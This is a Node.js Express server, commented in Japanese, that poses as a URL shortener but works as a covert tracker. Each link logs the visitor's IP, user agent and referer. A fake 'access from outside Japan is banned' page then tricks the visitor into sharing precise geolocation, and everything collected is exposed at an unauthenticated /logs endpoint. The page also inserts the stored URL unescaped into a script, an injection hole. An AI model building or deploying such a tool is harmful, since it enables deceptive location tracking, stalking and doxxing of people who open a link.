const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, 'public')));

const DATA_DIR = path.join(__dirname, 'data');
const LOG_FILE = path.join(DATA_DIR, 'logs.json');
const URLS_FILE = path.join(DATA_DIR, 'urls.json');

// データディレクトリとファイルの初期化
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, JSON.stringify([]));
if (!fs.existsSync(URLS_FILE)) fs.writeFileSync(URLS_FILE, JSON.stringify({}));

// ユニークID生成 (簡単なランダム文字列)
function generateId() {
  return Math.random().toString(36).slice(2, 8);
}

// --- 短縮URL発行API ---
app.post('/api/shorten', (req, res) => {
  const { originalUrl } = req.body;
  if (!originalUrl) return res.status(400).json({ error: 'URL is required' });

  const id = generateId();
  const urls = JSON.parse(fs.readFileSync(URLS_FILE));
  urls[id] = originalUrl;
  fs.writeFileSync(URLS_FILE, JSON.stringify(urls));

  const host = req.get('host');
  const protocol = req.protocol;
  const shortUrl = `${protocol}://${host}/s/${id}`;
  const logUrl = `${protocol}://${host}/logs.html`;

  res.json({ shortUrl, logUrl, id });
});

// --- 位置情報送信API ---
app.post('/location', (req, res) => {
  const { id, latitude, longitude } = req.body;
  if (!id || !latitude || !longitude) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
  // 位置情報を該当アクセスログに追記
  for (let i = logs.length - 1; i >= 0; i--) {
    if (logs[i].id === id && !logs[i].location) {
      logs[i].location = { latitude, longitude, timestamp: new Date().toISOString() };
      break;
    }
  }
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs));
  res.json({ message: 'Location saved' });
});

// --- 短縮URLアクセスルート ---
app.get('/s/:id', (req, res) => {
  const id = req.params.id;
  const urls = JSON.parse(fs.readFileSync(URLS_FILE));
  const originalUrl = urls[id];

  if (!originalUrl) return res.status(404).send('URL not found');

  // IP取得（複数も全部、先頭はグローバルIP）
  const ipRaw = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  const ipList = ipRaw.split(',').map(ip => ip.trim());
  const clientIP = ipList[0];

  // ユーザーエージェントなど
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers['referer'] || null;

  // ログ追加
  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
  logs.push({
    id,
    clientIP,
    allIPs: ipList,
    userAgent,
    referer,
    timestamp: new Date().toISOString(),
    location: null, // まだ位置情報なし
  });
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs));

  // 日本国外制限 → 日本にいるか位置情報で判定したいのでブラウザにページ返す
  res.send(`
    <!DOCTYPE html>
    <html lang="ja">
    <head>
      <meta charset="UTF-8" />
      <title>アクセス制限</title>
      <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f0f0f0; text-align:center; padding:50px; }
        #message { margin-bottom:20px; }
        button { padding:10px 20px; font-size:16px; cursor:pointer; }
      </style>
    </head>
    <body>
      <h1>このサイトは日本国外からのアクセスを禁止しています</h1>
      <p id="message">日本にいることを証明するため、位置情報の許可をしてください。</p>
      <button id="locBtn">位置情報を送信して続行</button>
      <script>
        const id = "${id}";
        const originalUrl = "${originalUrl}";

        document.getElementById('locBtn').onclick = () => {
          if (!navigator.geolocation) {
            alert('位置情報取得に対応していないブラウザです');
            return;
          }
          document.getElementById('message').textContent = '位置情報取得中...';
          navigator.geolocation.getCurrentPosition(pos => {
            fetch('/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                id,
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
              })
            }).then(res => res.json())
              .then(data => {
                document.getElementById('message').textContent = '位置情報送信完了。3秒後にリダイレクトします...';
                setTimeout(() => {
                  window.location.href = originalUrl;
                }, 3000);
              })
              .catch(() => {
                alert('位置情報送信でエラーが発生しました');
                document.getElementById('message').textContent = 'エラーが発生しました。もう一度お試しください。';
              });
          }, err => {
            alert('位置情報の許可が必要です');
            document.getElementById('message').textContent = '位置情報が許可されませんでした。続行できません。';
          });
        };
      </script>
    </body>
    </html>
  `);
});

// --- ログ閲覧用API（簡易版） ---
app.get('/logs', (req, res) => {
  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
  res.json(logs);
});

// --- サーバー起動 ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
});
